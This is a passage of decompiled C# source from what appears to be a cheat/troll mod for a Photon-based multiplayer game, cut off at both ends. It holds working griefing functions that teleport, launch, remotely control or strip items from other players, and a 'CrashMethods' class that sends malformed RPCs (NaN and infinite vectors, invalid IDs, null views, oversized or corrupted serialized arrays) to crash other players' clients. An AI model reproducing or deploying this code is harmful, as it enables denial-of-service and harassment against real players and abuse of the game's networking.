			}
			Vector3 center = Character.localCharacter.Center;
			int num = 0;
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (allCharacter != null && (includeSelf || !allCharacter.photonView.IsMine))
				{
					float num2 = (float)num * 360f / (float)Character.AllCharacters.Count * ((float)Math.PI / 180f);
					Vector3 val = new Vector3(Mathf.Cos(num2), 0f, Mathf.Sin(num2)) * 3f;
					TeleportPlayerToPosition(allCharacter, center + val, includeSelf);
					num++;
				}
			}
		}

		public static void MakeEveryoneSpin(float spinSpeed = 720f, float duration = 5f, bool includeSelf = false)
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (allCharacter != null)
				{
					MakePlayerSpin(allCharacter, spinSpeed, duration, includeSelf);
				}
			}
		}

		public static void MakePlayerJumpOffCliff(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				Vector3 lookDirection = target.data.lookDirection;
				lookDirection.y = 0f;
				(lookDirection).Normalize();
				LaunchPlayer(target, lookDirection + Vector3.up * 0.5f, 30f, includeSelf);
				Debug.Log((object)("[Troll] Made " + target.photonView.Owner.NickName + " jump off cliff!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to make player jump off cliff: " + ex.Message));
			}
		}
	}
	public static class EntityControl
	{
		private sealed class <SetScoutmasterTargetDelayed>d__1 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public GameObject scoutmaster;

			public Character target;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <SetScoutmasterTargetDelayed>d__1(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<>2__current = (object)new WaitForSeconds(0.5f);
					<>1__state = 1;
					return true;
				case 1:
					<>1__state = -1;
					if (scoutmaster != null && target != null)
					{
						ForceScoutmasterTarget(scoutmaster, target);
					}
					return false;
				}
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}

		public static GameObject SpawnScoutmasterAndTarget(Character targetPlayer, Vector3? spawnPosition = null, bool includeSelf = false)
		{
			if (targetPlayer == null || (Object)(object)targetPlayer.photonView == (Object)null)
			{
				return null;
			}
			if (!includeSelf && targetPlayer.photonView.IsMine)
			{
				return null;
			}
			if (!PhotonNetwork.InRoom)
			{
				return null;
			}
			try
			{
				Vector3 val = (Vector3)(((??)spawnPosition) ?? (targetPlayer.Center + Vector3.up * 5f + Vector3.forward * 10f));
				GameObject val2 = null;
				if (PhotonNetwork.IsMasterClient)
				{
					try
					{
						val2 = PhotonNetwork.InstantiateRoomObject("Character_Scoutmaster", val, Quaternion.identity, (byte)0, (object[])null);
					}
					catch (Exception ex)
					{
						Debug.Log((object)("[Troll] InstantiateRoomObject failed: " + ex.Message + ", trying regular Instantiate"));
					}
				}
				if (val2 == null)
				{
					try
					{
						val2 = PhotonNetwork.Instantiate("Character_Scoutmaster", val, Quaternion.identity, (byte)0, (object[])null);
					}
					catch (Exception ex2)
					{
						Debug.LogWarning((object)("[Troll] Regular Instantiate also failed: " + ex2.Message));
					}
				}
				if (val2 != null)
				{
					MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
					if (coroutineRunner != null)
					{
						coroutineRunner.StartCoroutine(SetScoutmasterTargetDelayed(val2, targetPlayer));
					}
					Debug.Log((object)("[Troll] Spawned scoutmaster targeting " + targetPlayer.photonView.Owner.NickName + "!"));
				}
				return val2;
			}
			catch (Exception ex3)
			{
				Debug.LogWarning((object)("[Troll] Failed to spawn scoutmaster: " + ex3.Message));
				return null;
			}
		}

		[IteratorStateMachine(typeof(<SetScoutmasterTargetDelayed>d__1))]
		private static IEnumerator SetScoutmasterTargetDelayed(GameObject scoutmaster, Character target)
		{
			return new <SetScoutmasterTargetDelayed>d__1(0)
			{
				scoutmaster = scoutmaster,
				target = target
			};
		}

		public static void ForceScoutmasterTarget(GameObject scoutmaster, Character targetPlayer)
		{
			if (scoutmaster == null || targetPlayer == null)
			{
				return;
			}
			try
			{
				Scoutmaster component = scoutmaster.GetComponent<Scoutmaster>();
				if (component != null)
				{
					MethodInfo method = typeof(Scoutmaster).GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method != null)
					{
						method.Invoke(component, new object[2] { targetPlayer, 999f });
						Debug.Log((object)("[Troll] Forced scoutmaster to target " + targetPlayer.photonView.Owner.NickName + "!"));
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to force scoutmaster target: " + ex.Message));
			}
		}

		public static void ForceZombieTarget(GameObject zombie, Character targetPlayer)
		{
			if (zombie == null || targetPlayer == null)
			{
				return;
			}
			try
			{
				MushroomZombie component = zombie.GetComponent<MushroomZombie>();
				if (!(component != null))
				{
					return;
				}
				MethodInfo method = typeof(MushroomZombie).GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method != null)
				{
					method.Invoke(component, new object[2] { targetPlayer, 999f });
					FieldInfo field = typeof(MushroomZombie).GetField("_currentState", BindingFlags.Instance | BindingFlags.Public);
					if (field != null)
					{
						field.SetValue(component, (object)(State)3);
					}
					Debug.Log((object)("[Troll] Forced zombie to target " + targetPlayer.photonView.Owner.NickName + "!"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to force zombie target: " + ex.Message));
			}
		}

		public static void StopForceScoutmasterTarget(GameObject scoutmaster)
		{
			if (scoutmaster == null)
			{
				return;
			}
			try
			{
				Scoutmaster component = scoutmaster.GetComponent<Scoutmaster>();
				if (!(component != null))
				{
					return;
				}
				MethodInfo method = typeof(Scoutmaster).GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method != null)
				{
					method.Invoke(component, new object[2] { null, 0f });
					FieldInfo field = typeof(Scoutmaster).GetField("targetForcedUntil", BindingFlags.Instance | BindingFlags.NonPublic);
					if (field != null)
					{
						field.SetValue(component, 0f);
					}
					Debug.Log((object)"[Troll] Stopped forcing scoutmaster target");
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to stop forcing scoutmaster target: " + ex.Message));
			}
		}

		public static void StopForceZombieTarget(GameObject zombie)
		{
			if (zombie == null)
			{
				return;
			}
			try
			{
				MushroomZombie component = zombie.GetComponent<MushroomZombie>();
				if (!(component != null))
				{
					return;
				}
				MethodInfo method = typeof(MushroomZombie).GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method != null)
				{
					if (Character.localCharacter != null)
					{
						method.Invoke(component, new object[2]
						{
							Character.localCharacter,
							0f
						});
					}
					FieldInfo field = typeof(MushroomZombie).GetField("_currentState", BindingFlags.Instance | BindingFlags.Public);
					if (field != null)
					{
						field.SetValue(component, (object)(State)2);
					}
					Debug.Log((object)"[Troll] Stopped forcing zombie target");
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to stop forcing zombie target: " + ex.Message));
			}
		}

		public static void StopForceAllScoutmasters()
		{
			Scoutmaster[] array = Object.FindObjectsByType<Scoutmaster>(FindObjectsSortMode.None);
			foreach (Scoutmaster val in array)
			{
				if (val != null && (Object)(object)val.gameObject != (Object)null)
				{
					StopForceScoutmasterTarget(val.gameObject);
				}
			}
			Debug.Log((object)"[Troll] Stopped forcing all scoutmaster targets");
		}

		public static void StopForceAllZombies()
		{
			MushroomZombie[] array = Object.FindObjectsByType<MushroomZombie>(FindObjectsSortMode.None);
			foreach (MushroomZombie val in array)
			{
				if (val != null && (Object)(object)val.gameObject != (Object)null)
				{
					StopForceZombieTarget(val.gameObject);
				}
			}
			Debug.Log((object)"[Troll] Stopped forcing all zombie targets");
		}

		public static void StartRemoteControl(Character targetPlayer, bool includeSelf = false)
		{
			if (!(targetPlayer == null) && !((Object)(object)targetPlayer.photonView == (Object)null) && (includeSelf || !targetPlayer.photonView.IsMine) && (Object)(object)targetPlayer.gameObject != (Object)null)
			{
				_1v1.lol_cheat.EntityControl.EnableControl(targetPlayer.gameObject);
				CheatConfig.CurrentlyControlledEntity = targetPlayer.gameObject;
				Debug.Log((object)("[Troll] Started remote controlling " + targetPlayer.photonView.Owner.NickName + "!"));
			}
		}

		public static void StopRemoteControl()
		{
			if (CheatConfig.CurrentlyControlledEntity != null)
			{
				_1v1.lol_cheat.EntityControl.DisableControl(CheatConfig.CurrentlyControlledEntity);
				CheatConfig.CurrentlyControlledEntity = null;
				Debug.Log((object)"[Troll] Stopped remote control!");
			}
		}
	}
	public static class ItemManipulation
	{
		public static void OpenAllLuggage()
		{
			try
			{
				Luggage[] array = Object.FindObjectsByType<Luggage>(FindObjectsSortMode.None);
				int num = 0;
				Luggage[] array2 = array;
				foreach (Luggage val in array2)
				{
					if (!(val != null) || !((Object)(object)val.photonView != (Object)null))
					{
						continue;
					}
					FieldInfo field = typeof(Luggage).GetField("state", BindingFlags.Instance | BindingFlags.NonPublic);
					if (field != null)
					{
						object value = field.GetValue(val);
						if (value != null && value.ToString() == "Closed")
						{
							val.photonView.RPC("OpenLuggageRPC", RpcTarget.All, new object[1] { true });
							num++;
						}
					}
					else
					{
						val.photonView.RPC("OpenLuggageRPC", RpcTarget.All, new object[1] { true });
						num++;
					}
				}
				if (num > 0)
				{
					Debug.Log((object)$"[Troll] Opened {num} luggage!");
					return;
				}
				FieldInfo field2 = typeof(Luggage).GetField("ALL_LUGGAGE", BindingFlags.Static | BindingFlags.Public);
				if (!(field2 != null) || !(field2.GetValue(null) is List<Luggage> list))
				{
					return;
				}
				num = 0;
				foreach (Luggage item in list)
				{
					if (item != null && (Object)(object)item.photonView != (Object)null)
					{
						item.photonView.RPC("OpenLuggageRPC", RpcTarget.All, new object[1] { true });
						num++;
					}
				}
				Debug.Log((object)$"[Troll] Opened {num} luggage (via static list)!");
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to open all luggage: " + ex.Message));
			}
		}

		public static void TeleportAllItems(Vector3 position)
		{
			try
			{
				Item[] array = Object.FindObjectsByType<Item>(FindObjectsSortMode.None);
				int num = 0;
				Item[] array2 = array;
				foreach (Item val in array2)
				{
					if (val != null && (Object)(object)val.photonView != (Object)null)
					{
						val.photonView.RPC("SetKinematicRPC", RpcTarget.AllBuffered, new object[3]
						{
							true,
							position,
							Quaternion.identity
						});
						num++;
					}
				}
				Debug.Log((object)$"[Troll] Teleported {num} items to position!");
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to teleport all items: " + ex.Message));
			}
		}

		public static void TeleportAllItemsToPlayer(Character target)
		{
			if (!(target == null))
			{
				TeleportAllItems(target.Center + Vector3.up * 2f);
			}
		}

		public static void TeleportAllItemsInFrontOfMe()
		{
			if (!(Character.localCharacter == null) && !(Camera.main == null))
			{
				Vector3 forward = Camera.main.transform.forward;
				Vector3 position = Camera.main.transform.position + forward * 3f;
				position.y = Character.localCharacter.Center.y;
				TeleportAllItems(position);
			}
		}

		public static void ForceDropAllItems(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				MethodInfo method = typeof(CharacterItems).GetMethod("DropAllItems", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method != null && target.refs != null && target.refs.items != null)
				{
					method.Invoke(target.refs.items, new object[1] { true });
					Debug.Log((object)("[Troll] Forced " + target.photonView.Owner.NickName + " to drop all items!"));
				}
				else if (PhotonNetwork.IsMasterClient)
				{
					for (byte b = 0; b < 3; b++)
					{
						target.player.EmptySlot(Optionable<byte>.Some(b));
					}
					target.player.EmptySlot(Optionable<byte>.Some((byte)3));
					target.player.EmptySlot(Optionable<byte>.Some((byte)250));
					Debug.Log((object)("[Troll] Forced " + target.photonView.Owner.NickName + " to drop all items (via slots)!"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to force drop all items: " + ex.Message));
			}
		}
	}
	public static class CrashMethods
	{
		public static void CrashPlayer_TriggerRelayBounds(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				TriggerRelay[] array = Object.FindObjectsByType<TriggerRelay>(FindObjectsSortMode.None);
				int num = 0;
				TriggerRelay[] array2 = array;
				foreach (TriggerRelay val in array2)
				{
					if (!(val != null))
					{
						continue;
					}
					FieldInfo field = typeof(TriggerRelay).GetField("view", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					PhotonView val2 = null;
					val2 = (PhotonView)((!(field != null)) ? ((object)((Component)val).GetComponent<PhotonView>()) : ((object)/*isinst with value type is only supported in some contexts*/));
					if (val2 != null && val2.ViewID != 0)
					{
						int num2 = val.transform.childCount + 9999;
						try
						{
							val2.RPC("RPCA_Trigger", target.photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							val2.RPC("RPCA_TriggerWithTarget", target.photonView.Owner, new object[2] { num2, -1 });
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = target.photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} TriggerRelay bounds violations to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] TriggerRelay bounds crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_TornadoNullRefs(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Tornado[] array = Object.FindObjectsByType<Tornado>(FindObjectsSortMode.None);
				int num = 0;
				Tornado[] array2 = array;
				foreach (Tornado val in array2)
				{
					if (!(val != null))
					{
						continue;
					}
					PhotonView component = ((Component)val).GetComponent<PhotonView>();
					if (component == null && (Object)(object)val.transform.parent != (Object)null)
					{
						component = ((Component)val.transform.parent).GetComponent<PhotonView>();
					}
					if (component != null && component.ViewID != 0)
					{
						int num2 = -1;
						try
						{
							component.RPC("RPCA_ThrowPlayer", target.photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							component.RPC("RPCA_CaptureCharacter", target.photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							component.RPC("RPCA_InitTornado", target.photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = target.photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} Tornado null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Tornado null ref crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_RescueHookNull(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				RescueHook[] array = Object.FindObjectsByType<RescueHook>(FindObjectsSortMode.None);
				int num = 0;
				RescueHook[] array2 = array;
				foreach (RescueHook val in array2)
				{
					if (!(val != null))
					{
						continue;
					}
					PhotonView component = ((Component)val).GetComponent<PhotonView>();
					if (component == null && (Object)(object)val.transform.parent != (Object)null)
					{
						component = ((Component)val.transform.parent).GetComponent<PhotonView>();
					}
					if (component != null && component.ViewID != 0)
					{
						try
						{
							component.RPC("RPCA_RescueCharacter", target.photonView.Owner, new object[1]);
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = target.photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} RescueHook null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] RescueHook null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_SpiderNull(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Spider[] array = Object.FindObjectsByType<Spider>(FindObjectsSortMode.None);
				int num = 0;
				Spider[] array2 = array;
				foreach (Spider val in array2)
				{
					if (!(val != null))
					{
						continue;
					}
					PhotonView photonView = val.photonView;
					if (photonView != null)
					{
						try
						{
							photonView.RPC("RPCA_GrabCharacter", target.photonView.Owner, new object[1]);
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = target.photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} Spider null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Spider null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_CharacterGrabbingNull(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				try
				{
					target.photonView.RPC("RPCA_GrabAttach", target.photonView.Owner, new object[3]
					{
						null,
						0,
						Vector3.zero
					});
					Player owner = target.photonView.Owner;
					Debug.Log((object)("[Crash] Sent CharacterGrabbing null ref to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] CharacterGrabbing null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_GetFedItemInvalid(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || target.photonView.IsMine)
			{
				return;
			}
			try
			{
				try
				{
					target.photonView.RPC("GetFedItemRPC", target.photonView.Owner, new object[1] { -1 });
				}
				catch
				{
				}
				try
				{
					target.photonView.RPC("GetFedItemRPC", target.photonView.Owner, new object[1] { 999999 });
				}
				catch
				{
				}
				Debug.Log((object)("[Crash] Sent invalid GetFedItemRPC  IMMEDIATE CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] GetFedItemRPC crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_DirectPlayerRPCs(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				for (int i = 0; i < 10; i++)
				{
					try
					{
						target.photonView.RPC("RPCA_GrabAttach", target.photonView.Owner, new object[3]
						{
							val,
							0,
							Vector3.zero
						});
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("RPCA_StartCarry", target.photonView.Owner, new object[1] { val });
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("WarpPlayerRPC", target.photonView.Owner, new object[2]
						{
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							false
						});
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("RPCA_Stick", target.photonView.Owner, new object[5]
						{
							(object)(BodypartType)4,
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)(STATUSTYPE)0,
							float.NaN
						});
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("RPCA_AddForceAtPosition", target.photonView.Owner, new object[3]
						{
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							float.NaN
						});
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("GetFedItemRPC", target.photonView.Owner, new object[1] { -1 });
					}
					catch
					{
					}
					try
					{
						target.photonView.RPC("GetFedItemRPC", target.photonView.Owner, new object[1] { 999999 });
					}
					catch
					{
					}
				}
				Player owner = target.photonView.Owner;
				Debug.Log((object)("[Crash] Sent direct player RPC crashes to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Direct player RPC crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_AllNullRefs(Character target, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = target.photonView.Owner;
				Debug.Log((object)("[Crash] Sending ALL null reference exploits to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_DirectPlayerRPCs(target);
				CrashPlayer_TriggerRelayBounds(target);
				CrashPlayer_TornadoNullRefs(target);
				CrashPlayer_RescueHookNull(target);
				CrashPlayer_SpiderNull(target);
				CrashPlayer_CharacterGrabbingNull(target);
				CrashPlayer_GetFedItemInvalid(target);
			}
		}

		public static void CrashPlayer_MaxArraySize(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Type type = Type.GetType("StatusSyncData");
				if (!(type != null) || !(type.GetConstructor(new Type[0]) != null))
				{
					return;
				}
				object obj = Activator.CreateInstance(type);
				FieldInfo field = type.GetField("statusList");
				if (field != null)
				{
					List<float> list = new List<float>();
					int num = 1000000;
					for (int i = 0; i < num; i++)
					{
						list.Add(float.MaxValue);
					}
					field.SetValue(obj, list);
					MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
					if (method != null)
					{
						byte[] array = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
						target.photonView.RPC("SyncStatusesRPC", target.photonView.Owner, new object[1] { array });
						Debug.Log((object)$"[Crash] Sent maximum array size ({num} elements)  MEMORY EXHAUSTION CRASH (target: {target.photonView.Owner.NickName})");
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Max array size failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Inventory(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[10000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = byte.MaxValue;
				}
				target.player.photonView.RPC("SyncInventoryRPC", target.photonView.Owner, new object[2] { array, true });
				try
				{
					Type type = Type.GetType("InventorySyncData");
					if (type != null && type.GetConstructor(new Type[0]) != null)
					{
						object obj = Activator.CreateInstance(type);
						FieldInfo field = type.GetField("slotCount");
						FieldInfo field2 = type.GetField("slots");
						if (field != null && field2 != null)
						{
							field.SetValue(obj, byte.MaxValue);
							object[] array2 = new object[255];
							for (int j = 0; j < 255; j++)
							{
								array2[j] = new object();
							}
							field2.SetValue(obj, array2);
							MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
							if (method != null)
							{
								byte[] array3 = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
								target.player.photonView.RPC("SyncInventoryRPC", target.photonView.Owner, new object[2] { array3, true });
							}
						}
					}
				}
				catch
				{
				}
				Debug.Log((object)("[Crash] Sent corrupted inventory data  MEMORY/DESERIALIZATION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Inventory crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_StatusArrayBounds(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Type type = Type.GetType("StatusSyncData");
				if (type != null && type.GetConstructor(new Type[0]) != null)
				{
					object obj = Activator.CreateInstance(type);
					FieldInfo field = type.GetField("statusList");
					if (field != null)
					{
						List<float> list = new List<float>();
						for (int i = 0; i < 50000; i++)
						{
							list.Add(float.MaxValue);
						}
						field.SetValue(obj, list);
						MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
						if (method != null)
						{
							byte[] array = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
							target.photonView.RPC("SyncStatusesRPC", target.photonView.Owner, new object[1] { array });
						}
					}
				}
				Debug.Log((object)("[Crash] Sent oversized status array  MEMORY EXHAUSTION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Status array bounds crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Deserialization(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[50000];
				BitConverter.GetBytes(int.MaxValue).CopyTo(array, 0);
				for (int i = 4; i < array.Length; i++)
				{
					array[i] = byte.MaxValue;
				}
				target.player.photonView.RPC("SyncInventoryRPC", target.photonView.Owner, new object[2] { array, true });
				target.photonView.RPC("SyncStatusesRPC", target.photonView.Owner, new object[1] { array });
				target.photonView.RPC("SyncAfflictionsRPC", target.photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent malformed deserialization data  DESERIALIZATION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Deserialization crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_NullReferences(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				if (target.refs != null && target.refs.carriying != null)
				{
					target.photonView.RPC("RPCA_StartCarry", target.photonView.Owner, new object[1] { val });
				}
				try
				{
					CharacterSpawner val2 = Object.FindFirstObjectByType<CharacterSpawner>();
					if (val2 != null && (Object)(object)val2.photonView != (Object)null)
					{
						object obj = Activator.CreateInstance(typeof(ReconnectData));
						val2.photonView.RPC("SpawnPlayerRPC", target.photonView.Owner, new object[2] { false, obj });
					}
				}
				catch
				{
				}
				Player owner = target.photonView.Owner;
				Debug.Log((object)("[Crash] Sent null references to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Null reference crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_DivisionByZero(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				target.photonView.RPC("RPCA_AddForceAtPosition", target.photonView.Owner, new object[3]
				{
					Vector3.zero,
					target.Center,
					0f
				});
				target.photonView.RPC("WarpPlayerRPC", target.photonView.Owner, new object[2]
				{
					(object)new Vector3(float.NaN, float.NaN, float.NaN),
					false
				});
				Player owner = target.photonView.Owner;
				Debug.Log((object)("[Crash] Sent NaN/Division by zero to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Division by zero crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_ExtremeValues(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				for (int i = 0; i < 5; i++)
				{
					target.photonView.RPC("RPCA_Fall", target.photonView.Owner, new object[1] { float.MaxValue });
					target.photonView.RPC("WarpPlayerRPC", target.photonView.Owner, new object[2]
					{
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						false
					});
					target.photonView.RPC("WarpPlayerRPC", target.photonView.Owner, new object[2]
					{
						(object)new Vector3(float.PositiveInfinity, float.PositiveInfinity, float.PositiveInfinity),
						false
					});
					target.photonView.RPC("WarpPlayerRPC", target.photonView.Owner, new object[2]
					{
						(object)new Vector3(float.NegativeInfinity, float.NegativeInfinity, float.NegativeInfinity),
						false
					});
					target.photonView.RPC("RPCA_Stick", target.photonView.Owner, new object[5]
					{
						(object)(BodypartType)4,
						(object)new Vector3(float.PositiveInfinity, float.PositiveInfinity, float.PositiveInfinity),
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						(object)(STATUSTYPE)0,
						float.MaxValue
					});
					target.photonView.RPC("RPCA_AddForceAtPosition", target.photonView.Owner, new object[3]
					{
						(object)new Vector3(float.MaxValue, float.MaxValue, float.MaxValue),
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						float.MaxValue
					});
				}
				Player owner = target.photonView.Owner;
				Debug.Log((object)("[Crash] Sent extreme values to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Extreme values crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_InvalidPhotonView(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
